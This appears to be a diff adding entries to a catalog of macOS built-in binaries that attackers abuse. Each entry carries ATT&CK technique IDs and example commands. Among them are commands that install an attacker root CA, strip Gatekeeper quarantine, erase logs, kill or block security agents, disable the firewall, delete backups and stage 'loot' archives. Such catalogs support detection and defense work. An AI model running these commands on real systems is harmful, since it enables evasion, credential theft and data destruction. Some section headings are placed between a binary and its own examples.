+command = '''dsenableroot -u admin -p ADMINPASS -r NEWROOTPASS'''
+explanation = "Turns on the disabled root account with a chosen password, given an admin's credentials."
+privilege = "root"
+
+[[binary]]
+name = "installer"
+paths = ["/usr/sbin/installer"]
+techniques = ["T1546.016"]
+privilege = "root"
+abuse = "Installs .pkg files whose preinstall/postinstall scripts run as root."
+
+[[binary.example]]
+title = "Install a package with scripts"
+command = '''installer -pkg /tmp/evil.pkg -target /'''
+explanation = "Runs a .pkg whose preinstall/postinstall scripts execute as root."
+privilege = "root"
+
+[[binary]]
+name = "kmutil"
+paths = ["/usr/bin/kmutil"]
+techniques = ["T1547.006", "T1518.001"]
+privilege = "root"
+abuse = "Loads kernel extensions and lists loaded ones (showloaded), which reveals security products."
+
+# --- Credential access ------------------------------------------------------------------------
+
+[[binary.example]]
+title = "List loaded kernel extensions"
+command = '''kmutil showloaded'''
+explanation = "Lists loaded kexts, which reveals installed security and virtualization drivers."
+privilege = "root"
+
+[[binary]]
+name = "security"
+paths = ["/usr/bin/security"]
+techniques = ["T1555.001", "T1553.004"]
+privilege = "user"
+abuse = "Keychain CLI: find-generic-password -w and dump-keychain read secrets (after a prompt the user may accept); add-trusted-cert installs a root CA."
+
+[[binary.example]]
+title = "Read a keychain password"
+command = '''security find-generic-password -s 'service' -w'''
+explanation = "Prints a stored password; the user may be prompted to allow access."
+
+[[binary.example]]
+title = "Install a trusted root certificate"
+command = '''security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/evil.cer'''
+explanation = "Adds an attacker CA to the system trust store, enabling TLS interception."
+privilege = "root"
+
+[[binary]]
+name = "kcc"
+paths = ["/usr/bin/kcc", "/usr/bin/klist"]
+techniques = ["T1558"]
+privilege = "user"
+abuse = "Kerberos credential-cache tool (klist, kswitch); on AD-bound Macs it lists and selects tickets usable for lateral movement."
+
+[[binary.example]]
+title = "List Kerberos tickets"
+command = '''klist'''
+explanation = "Shows cached Kerberos tickets on an AD-bound Mac, usable for lateral movement."
+
+[[binary]]
+name = "pwpolicy"
+paths = ["/usr/bin/pwpolicy"]
+techniques = ["T1201"]
+privilege = "user"
+abuse = "getaccountpolicies shows password length, complexity and lockout rules, which tunes guessing attacks."
+
+[[binary.example]]
+title = "Read the password policy"
+command = '''pwpolicy getaccountpolicies'''
+explanation = "Reports length, complexity and lockout rules, which tunes password-guessing."
+
+[[binary]]
+name = "tcpdump"
+paths = ["/usr/sbin/tcpdump"]
+techniques = ["T1040"]
+privilege = "root"
+abuse = "Captures traffic, including cleartext credentials on the local segment."
+
+# --- Defense evasion --------------------------------------------------------------------------
+
+[[binary.example]]
+title = "Capture cleartext credentials"
+command = "tcpdump -i en0 -A -s0 'tcp port 80'"
+explanation = "Captures packet contents on the local segment, including credentials sent in the clear."
+privilege = "root"
+
+[[binary]]
+name = "xattr"
+paths = ["/usr/bin/xattr"]
+techniques = ["T1553.001"]
+privilege = "user"
+abuse = "xattr -d com.apple.quarantine removes the quarantine flag, so Gatekeeper never checks the file on first launch."
+
+[[binary.example]]
+title = "Strip the quarantine flag"
+command = '''xattr -d com.apple.quarantine /tmp/Payload.app'''
+explanation = "Removes the quarantine attribute so Gatekeeper never assesses the file on first launch."
+
+[[binary]]
+name = "spctl"
+paths = ["/usr/sbin/spctl"]
+techniques = ["T1553.001", "T1518.001"]
+privilege = "user"
+abuse = "--status reports Gatekeeper state and --assess tests a file. As admin, --master-disable starts disabling Gatekeeper; recent macOS also needs confirmation in System Settings."
+
+[[binary.example]]
+title = "Check Gatekeeper status"
+command = '''spctl --status'''
+explanation = "Reports whether Gatekeeper assessment is enabled before tampering."
+
+[[binary.example]]
+title = "Assess a file"
+command = '''spctl -a -vv /tmp/Payload.app'''
+explanation = "Tests whether a file would pass Gatekeeper, useful for pre-flighting a payload."
+
+[[binary]]
+name = "csrutil"
+paths = ["/usr/bin/csrutil"]
+techniques = ["T1518.001", "T1562.001"]
+privilege = "user"
+abuse = "status reveals whether System Integrity Protection is on; disabling it only works from recoveryOS."
+
+[[binary.example]]
+title = "Check SIP status"
+command = '''csrutil status'''
+explanation = "Reveals whether System Integrity Protection is enabled; disabling it requires recoveryOS."
+
+[[binary]]
+name = "tccutil"
+paths = ["/usr/bin/tccutil"]
+techniques = ["T1562.001"]
+privilege = "user"
+abuse = "reset clears privacy grants, e.g. revoking a security tool's Full Disk Access or forcing re-prompts."
+
+[[binary.example]]
+title = "Revoke a tool's privacy grant"
+command = '''tccutil reset ScreenCapture com.vendor.edr'''
+explanation = "Clears a privacy grant, e.g. stripping a security tool's permission or forcing re-prompts."
+
+[[binary]]
+name = "codesign"
+paths = ["/usr/bin/codesign"]
+techniques = ["T1553.002", "T1518"]
+privilege = "user"
+abuse = "Ad-hoc signs (-s -) tampered binaries so Apple silicon will run them; -d dumps signatures and entitlements for target selection."
+
+[[binary.example]]
+title = "Ad-hoc sign a tampered binary"
+command = '''codesign -s - -f /tmp/implant'''
+explanation = "Applies an ad-hoc signature so Apple silicon will run a modified or unsigned binary."
+
+[[binary.example]]
+title = "Dump a target's entitlements"
+command = '''codesign -d --entitlements :- /usr/bin/osascript'''
+explanation = "Prints another binary's signature and entitlements for target selection."
+
+[[binary]]
+name = "chflags"
+paths = ["/usr/bin/chflags"]
+techniques = ["T1564.001"]
+privilege = "user"
+abuse = "chflags hidden hides files and folders from Finder without renaming them."
+
+[[binary.example]]
+title = "Hide a file from Finder"
+command = '''chflags hidden /tmp/.implant'''
+explanation = "Sets the hidden flag so a file or folder disappears from Finder without renaming."
+
+[[binary]]
+name = "touch"
+paths = ["/usr/bin/touch"]
+techniques = ["T1070.006"]
+privilege = "user"
+abuse = "-t and -r rewrite modification and access times to blend dropped files in."
+
+[[binary.example]]
+title = "Timestomp a dropped file"
+command = '''touch -r /bin/ls /tmp/implant'''
+explanation = "Copies another file's timestamps onto a payload so it blends with system files."
+
+[[binary]]
+name = "chmod"
+paths = ["/bin/chmod"]
+techniques = ["T1222.002"]
+privilege = "user"
+abuse = "Marks downloaded payloads executable; as root sets setuid bits for a backdoor."
+
+[[binary.example]]
+title = "Make a payload executable"
+command = '''chmod +x /tmp/implant'''
+explanation = "Marks a downloaded file executable so it can run."
+
+[[binary]]
+name = "log"
+paths = ["/usr/bin/log"]
+techniques = ["T1070.002", "T1005"]
+privilege = "user"
+abuse = "log show/stream scrape secrets and activity from the unified log; log erase (root) wipes it."
+
+[[binary.example]]
+title = "Scrape the unified log"
+command = "/usr/bin/log show --last 1h --predicate 'eventMessage contains \"password\"'"
+explanation = "Searches the unified log for secrets and activity."
+
+[[binary.example]]
+title = "Wipe the unified log"
+command = '''/usr/bin/log erase --all'''
+explanation = "Destroys collected log data to remove evidence."
+privilege = "root"
+
+[[binary]]
+name = "base64"
+paths = ["/usr/bin/base64"]
+techniques = ["T1140", "T1027"]
+privilege = "user"
+abuse = "Encodes and decodes (-D) payloads embedded in scripts and command lines."
+
+[[binary.example]]
+title = "Decode an embedded payload"
+command = '''base64 -D -i blob.b64 -o /tmp/p'''
+explanation = "Turns a base64 blob carried in a script back into its original bytes."
+
+[[binary]]
+name = "xxd"
+paths = ["/usr/bin/xxd"]
+techniques = ["T1140"]
+privilege = "user"
+abuse = "xxd -r -p turns a hex string back into a binary, a common way to smuggle payloads through text channels."
+
+[[binary.example]]
+title = "Rebuild a binary from hex"
+command = '''xxd -r -p blob.hex > /tmp/p'''
+explanation = "Reverses a hex dump back into a binary, a way to smuggle payloads through text channels."
+
+[[binary]]
+name = "uudecode"
+paths = ["/usr/bin/uudecode"]
+techniques = ["T1140"]
+privilege = "user"
+abuse = "Decodes uuencoded payloads embedded in scripts or mail."
+
+[[binary.example]]
+title = "Decode a uuencoded payload"
+command = '''uudecode -o /tmp/p blob.uu'''
+explanation = "Decodes a uuencoded blob embedded in a script or mail message."
+
+[[binary]]
+name = "socketfilterfw"
+paths = ["/usr/libexec/ApplicationFirewall/socketfilterfw"]
+techniques = ["T1562.004", "T1518.001"]
+privilege = "user"
+abuse = "--getglobalstate reveals the application firewall; as root, --setglobalstate off or --add allowlists a payload."
+xpc_functionality = "Application Firewall control and status, including global enablement, block-all and stealth modes, logging, and per-application allow/block rules. The registered message service also carries firewall events and requests. Which operations a particular caller may invoke depends on the daemon's connection-admission checks."
+
+[[binary.example]]
+title = "Disable the application firewall"
+command = '''/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off'''
+explanation = "As root, turns off the application firewall so a payload can accept connections."
+privilege = "root"
+
+[[binary.example]]
+title = "Allowlist a binary"
+command = '''/usr/libexec/ApplicationFirewall/socketfilterfw --add /tmp/implant'''
+explanation = "Adds a program to the firewall's allow list."
+privilege = "root"
+
+[[binary]]
+name = "pfctl"
+paths = ["/sbin/pfctl"]
+techniques = ["T1562.004"]
+privilege = "root"
+abuse = "Flushes or loads packet-filter rules, e.g. blocking an EDR's telemetry endpoint."
+
+[[binary.example]]
+title = "Block an EDR endpoint"
+command = '''echo 'block drop to 203.0.113.10' | pfctl -f -'''
+explanation = "Loads packet-filter rules, e.g. dropping traffic to a security vendor's telemetry host."
+privilege = "root"
+
+[[binary]]
+name = "killall"
+paths = ["/usr/bin/killall", "/usr/bin/pkill"]
+techniques = ["T1489", "T1562.001"]
+privilege = "user"
+abuse = "Terminates processes by name: security agents (as root), or apps holding files open before encryption."
+
+[[binary.example]]
+title = "Kill a security agent"
+command = '''killall -9 MDATP'''
+explanation = "Terminates processes by name, such as an EDR agent (as root) or apps holding files open before encryption."
+
+[[binary]]
+name = "sudo"
+paths = ["/usr/bin/sudo"]
+techniques = ["T1548.003"]
+privilege = "user"
+abuse = "Cached credentials (default 5-minute timestamp) let a later process elevate without a password prompt."
+
+# --- Discovery --------------------------------------------------------------------------------
+
+[[binary.example]]
+title = "Reuse a cached credential"
+command = '''sudo -n id'''
+explanation = "If a recent sudo left a valid timestamp (default five minutes), -n elevates with no password prompt."
+
+[[binary]]
+name = "system_profiler"
+paths = ["/usr/sbin/system_profiler"]
+techniques = ["T1082", "T1497.001", "T1120"]
+privilege = "user"
+abuse = "Full hardware and software inventory; SPHardwareDataType's model and serial reveal virtual machines."
+
+[[binary.example]]
+title = "Detect a virtual machine"
+command = '''system_profiler SPHardwareDataType'''
+explanation = "Reports model and serial; VM-specific values betray a sandbox or analysis host."
+
+[[binary]]
+name = "sysctl"
+paths = ["/usr/sbin/sysctl"]
+techniques = ["T1082", "T1497.001"]
+privilege = "user"
+abuse = "hw.model and kern.hv_vmm_present expose virtualization; also CPU, memory and boot time."
+
+[[binary.example]]
+title = "Check for a hypervisor"
+command = '''sysctl kern.hv_vmm_present hw.model'''
+explanation = "A set hv_vmm_present flag or a VM model string reveals virtualization."
+
+[[binary]]
+name = "ioreg"
+paths = ["/usr/sbin/ioreg"]
+techniques = ["T1082", "T1497.001", "T1120"]
+privilege = "user"
+abuse = "I/O Registry dump: serial number, attached devices and virtual hardware names used for VM detection."
+
+[[binary.example]]
+title = "Find virtual hardware"
+command = "ioreg -l | grep -i -E 'virtual|vmware|parallels|qemu'"
+explanation = "The I/O Registry exposes device names that identify a VM."
+
+[[binary]]
+name = "sw_vers"
+paths = ["/usr/bin/sw_vers"]
+techniques = ["T1082"]
+privilege = "user"
+abuse = "OS version and build, used to pick exploits."
+
+[[binary.example]]
+title = "Read the OS version"
+command = '''sw_vers'''
+explanation = "Prints product version and build, used to pick matching exploits."
+
+[[binary]]
+name = "Host identity basics"
+paths = ["/usr/bin/uname", "/bin/hostname", "/usr/sbin/scutil"]
+techniques = ["T1082", "T1016"]
+privilege = "user"
+abuse = "Kernel version, host and computer names; scutil --dns/--proxy also expose network configuration."
+
+[[binary.example]]
+title = "Dump DNS and proxy config"
+command = '''scutil --dns; scutil --proxy'''
+explanation = "scutil exposes resolver and proxy settings alongside host naming."
+
+[[binary.example]]
+title = "Read the kernel and host name"
+command = '''uname -a; hostname'''
+explanation = "Reports kernel version and the machine's host name during discovery."
+
+[[binary]]
+name = "User identity basics"
+paths = ["/usr/bin/id", "/usr/bin/whoami", "/usr/bin/groups", "/usr/bin/who", "/usr/bin/w", "/usr/bin/last"]
+techniques = ["T1033", "T1087.001", "T1069.001"]
+privilege = "user"
+abuse = "Current user, admin group membership, logged-in sessions and login history."
+
+[[binary.example]]
+title = "Check admin group membership"
+command = '''id; groups'''
+explanation = "Shows the current user's IDs and group membership, including admin."
+
+[[binary.example]]
+title = "List recent logins"
+command = '''last -5'''
+explanation = "Prints recent login sessions from the host's login history."
+
+[[binary]]
+name = "dscacheutil"
+paths = ["/usr/bin/dscacheutil"]
+techniques = ["T1087.001", "T1069.001"]
+privilege = "user"
+abuse = "-q user and -q group dump every account and group, including hidden service accounts."
+
+[[binary.example]]
+title = "Dump every account"
+command = '''dscacheutil -q user'''
+explanation = "Lists all user records, including hidden service accounts, from the directory cache."
+
+[[binary]]
+name = "ldapsearch"
+paths = ["/usr/bin/ldapsearch"]
+techniques = ["T1087.002", "T1069.002"]
+privilege = "user"
+abuse = "Queries Active Directory/LDAP for users, groups and computers from a bound Mac."
+
+[[binary.example]]
+title = "Query Active Directory for users"
+command = '''ldapsearch -H ldap://dc.corp.local -x -b 'dc=corp,dc=local' '(objectClass=user)' sAMAccountName'''
+explanation = "Reads users, groups and computers from AD on a bound Mac."
+
+[[binary]]
+name = "dsconfigad"
+paths = ["/usr/sbin/dsconfigad"]
+techniques = ["T1087.002", "T1082"]
+privilege = "user"
+abuse = "-show reveals the AD domain, computer account and admin-group mappings."
+
+[[binary.example]]
+title = "Show AD binding"
+command = '''dsconfigad -show'''
+explanation = "Reveals the AD domain, computer account and admin-group mappings."
+
+[[binary]]
+name = "ps"
+paths = ["/bin/ps"]
+techniques = ["T1057"]
+privilege = "user"
+abuse = "Process listing with full arguments (ps -axww), which can leak secrets passed on command lines."
+
+[[binary.example]]
+title = "List processes with full arguments"
+command = '''ps -axww'''
+explanation = "Shows every process with full command lines, which can leak secrets passed as arguments."
+
+[[binary]]
+name = "lsof"
+paths = ["/usr/sbin/lsof"]
+techniques = ["T1049", "T1057", "T1083"]
+privilege = "user"
+abuse = "-i maps network connections to processes; also shows which files each process holds open."
+
+[[binary.example]]
+title = "Map network connections to processes"
+command = '''lsof -i -nP'''
+explanation = "Associates open sockets with the processes that own them."
+
+[[binary]]
+name = "netstat"
+paths = ["/usr/sbin/netstat"]
+techniques = ["T1049", "T1016"]
+privilege = "user"
+abuse = "Active connections, listening ports and routing table."
+
+[[binary.example]]
+title = "List active connections and ports"
+command = '''netstat -an'''
+explanation = "Shows connections, listening ports and the routing table."
+
+[[binary]]
+name = "arp"
+paths = ["/usr/sbin/arp"]
+techniques = ["T1018"]
+privilege = "user"
+abuse = "arp -a lists neighbouring hosts already seen on the LAN with no scanning traffic."
+
+[[binary.example]]
+title = "List neighbouring hosts"
+command = '''arp -a'''
+explanation = "Reports hosts already seen on the LAN, with no scanning traffic."
+
+[[binary]]
+name = "ifconfig"
+paths = ["/sbin/ifconfig"]
+techniques = ["T1016"]
+privilege = "user"
+abuse = "Interfaces, addresses and MACs."
+
+[[binary.example]]
+title = "Read interfaces and addresses"
+command = '''ifconfig'''
+explanation = "Lists interfaces, IP addresses and MACs."
+
+[[binary]]
+name = "dns-sd"
+paths = ["/usr/bin/dns-sd"]
+techniques = ["T1046", "T1018"]
+privilege = "user"
+abuse = "Browses Bonjour (-B _ssh._tcp, _smb._tcp ...) to find hosts and services without port scanning."
+
+[[binary.example]]
+title = "Browse for services via Bonjour"
+command = '''dns-sd -B _ssh._tcp'''
+explanation = "Discovers hosts offering a service through Bonjour without port scanning."
+
+[[binary]]
+name = "smbutil"
+paths = ["/usr/bin/smbutil"]
+techniques = ["T1135", "T1018"]
+privilege = "user"
+abuse = "smbutil view lists shares on a remote host; lookup resolves NetBIOS names."
+
+[[binary.example]]
+title = "List shares on a remote host"
+command = '''smbutil view //user@host.example'''
+explanation = "Enumerates SMB shares offered by a remote host."
+
+[[binary]]
+name = "sharing"
+paths = ["/usr/sbin/sharing"]
+techniques = ["T1135"]
+privilege = "user"
+abuse = "-l lists this Mac's file-sharing points; as root, -a publishes a new share."
+
+[[binary.example]]
+title = "List this Mac's shares"
+command = '''sharing -l'''
+explanation = "Lists file-sharing points; as root, -a publishes a new share."
+
+[[binary]]
+name = "mdfind"
+paths = ["/usr/bin/mdfind"]
+techniques = ["T1083", "T1005"]
+privilege = "user"
+abuse = "Spotlight queries locate documents, keys and password files instantly without walking the disk."
+
+[[binary.example]]
+title = "Locate sensitive files instantly"
+command = "mdfind 'kMDItemDisplayName == \"*.pem\"'"
+explanation = "Queries the Spotlight index to find documents and keys without walking the disk."
+
+[[binary]]
+name = "lsregister"
+paths = ["/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister"]
+techniques = ["T1518"]
+privilege = "user"
+abuse = "-dump prints the LaunchServices database: every registered app, URL scheme and document handler."
+
+[[binary.example]]
+title = "Dump the LaunchServices database"
+command = '''/System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/LaunchServices.framework/Versions/A/Support/lsregister -dump'''
+explanation = "Prints every registered app, URL scheme and document handler."
+
+[[binary]]
+name = "pkgutil"
+paths = ["/usr/sbin/pkgutil"]
+techniques = ["T1518"]
+privilege = "user"
+abuse = "--pkgs and --pkg-info list installed packages (security agents included); --expand unpacks a .pkg for tampering."
+
+[[binary.example]]
+title = "List installed packages"
+command = '''pkgutil --pkgs'''
+explanation = "Enumerates installed package receipts, including security agents."
+
+[[binary]]
+name = "systemextensionsctl"
+paths = ["/usr/bin/systemextensionsctl"]
+techniques = ["T1518.001"]
+privilege = "user"
+abuse = "list shows installed system extensions, i.e. EDR endpoint-security and network-filter products."
+
+[[binary.example]]
+title = "List system extensions"
+command = '''systemextensionsctl list'''
+explanation = "Shows installed system extensions, i.e. EDR endpoint-security and network-filter products."
+
+[[binary]]
+name = "softwareupdate"
+paths = ["/usr/sbin/softwareupdate"]
+techniques = ["T1082"]
+privilege = "user"
+abuse = "--history and --list reveal patch level and pending security updates."
+
+[[binary.example]]
+title = "Read patch level"
+command = '''softwareupdate --history'''
+explanation = "Lists installed updates and pending ones, revealing how current the host is."
+
+[[binary]]
+name = "wdutil"
+paths = ["/usr/bin/wdutil"]
+techniques = ["T1016"]
+privilege = "root"
+abuse = "wdutil info dumps Wi-Fi network, BSSID and interface details."
+
+[[binary.example]]
+title = "Dump Wi-Fi details"
+command = '''wdutil info'''
+explanation = "Reports the connected Wi-Fi network, BSSID and interface details."
+privilege = "root"
+
+[[binary]]
+name = "profiles"
+paths = ["/usr/bin/profiles"]
+techniques = ["T1082", "T1553.004"]
+privilege = "user"
+abuse = "Lists configuration profiles and MDM enrolment. Profile installs need user approval in System Settings, so attackers lure users into adding profiles that set proxies or trust roots."
+
+# --- Collection -------------------------------------------------------------------------------
+
+[[binary.example]]
+title = "List configuration profiles"
+command = '''profiles list'''
+explanation = "Shows installed configuration profiles and MDM enrolment state."
+
+[[binary]]
+name = "screencapture"
+paths = ["/usr/sbin/screencapture"]
+techniques = ["T1113"]
+privilege = "user"
+abuse = "Silent (-x) screenshots; needs Screen Recording permission for the responsible app."
+
+[[binary.example]]
+title = "Take a silent screenshot"
+command = '''screencapture -x /tmp/s.png'''
+explanation = "Captures the screen without the shutter sound; needs Screen Recording permission for the responsible app."
+
+[[binary]]
+name = "pbpaste"
+paths = ["/usr/bin/pbpaste"]
+techniques = ["T1115"]
+privilege = "user"
+abuse = "Prints the clipboard, where users paste passwords and tokens."
+
+[[binary.example]]
+title = "Read the clipboard"
+command = '''pbpaste > /tmp/clip.txt'''
+explanation = "Prints the clipboard contents, where users often paste passwords and tokens."
+
+[[binary]]
+name = "Archivers"
+paths = ["/usr/bin/ditto", "/usr/bin/zip", "/usr/bin/tar"]
+techniques = ["T1560.001"]
+privilege = "user"
+abuse = "Stage collected data in (optionally password-protected, zip -e) archives; ditto -c -k keeps extended attributes."
+
+[[binary.example]]
+title = "Stage data in a password-protected zip"
+command = '''zip -e -r /tmp/loot.zip ~/Documents'''
+explanation = "Archives collected data into an encrypted zip for staging before exfiltration."
+
+[[binary.example]]
+title = "Archive keeping extended attributes"
+command = '''ditto -c -k --keepParent ~/Documents /tmp/loot.zip'''
+explanation = "ditto builds an archive that preserves extended attributes and resource forks."
+
+[[binary]]
+name = "hdiutil"
+paths = ["/usr/bin/hdiutil"]
+techniques = ["T1560.001"]
+privilege = "user"
+abuse = "Creates encrypted disk images for staging data and mounts DMGs delivered by phishing."
+
+# --- Lateral movement and remote access --------------------------------------------------------
+
+[[binary.example]]
+title = "Create an encrypted disk image"
+command = '''hdiutil create -encryption -stdinpass -size 100m -volname loot /tmp/loot.dmg'''
+explanation = "Makes an encrypted DMG for staging collected data."
+
+[[binary]]
+name = "systemsetup"
+paths = ["/usr/sbin/systemsetup"]
+techniques = ["T1021.004", "T1082"]
+privilege = "root"
+abuse = "-setremotelogin on enables SSH; -getremotelogin and others report current settings."
+
+[[binary.example]]
+title = "Enable remote login (SSH)"
+command = '''systemsetup -setremotelogin on'''
+explanation = "Turns on the SSH server for remote access."
+privilege = "root"
+
+[[binary]]
+name = "kickstart"
+paths = ["/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart"]
+techniques = ["T1021.005"]
+privilege = "root"
+abuse = "Enables Apple Remote Desktop / Screen Sharing for chosen users with chosen privileges."
+
+# --- Impact -----------------------------------------------------------------------------------
+
+[[binary.example]]
+title = "Enable Apple Remote Desktop"
+command = '''/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -access -on -privs -all -restart -agent'''
+explanation = "Turns on Screen Sharing / Remote Desktop with full privileges for remote control."
+privilege = "root"
+
+[[binary]]
+name = "tmutil"
+paths = ["/usr/bin/tmutil"]
+techniques = ["T1490"]
+privilege = "root"
+abuse = "deletelocalsnapshots and disable remove Time Machine restore points before encryption."
+
+[[binary.example]]
+title = "Delete local snapshots"
+command = '''tmutil deletelocalsnapshots /'''
+explanation = "Removes Time Machine restore points before destructive action."
+privilege = "root"
+
+[[binary]]
+name = "diskutil"
+paths = ["/usr/sbin/diskutil"]
+techniques = ["T1561", "T1082", "T1120"]
+privilege = "user"
+abuse = "list and info enumerate disks and volumes; eraseDisk and eraseVolume destroy data."
+
+[[binary.example]]
+title = "Enumerate disks and volumes"
+command = '''diskutil list'''
+explanation = "Lists disks and volumes; eraseDisk and eraseVolume destroy data."
+
+[[binary]]
+name = "shutdown"
+paths = ["/sbin/shutdown", "/sbin/reboot"]
+techniques = ["T1529"]
+privilege = "root"
+abuse = "Forces a reboot or halt, e.g. to finish an install or to disrupt recovery."
+
+[[binary.example]]
+title = "Force a reboot"
+command = '''shutdown -r now'''
+explanation = "Reboots immediately, e.g. to finish an install or disrupt recovery."
+privilege = "root"
+
+[[binary]]
+name = "nvram"
+paths = ["/usr/sbin/nvram"]
+techniques = ["T1082"]
+privilege = "user"
+abuse = "-p prints firmware variables (boot-args, recent volumes); as root it sets them."
+
+[[binary.example]]
+title = "Read firmware variables"
+command = '''nvram -p'''
+explanation = "Prints firmware variables such as boot-args and recent volumes; as root it can set them."
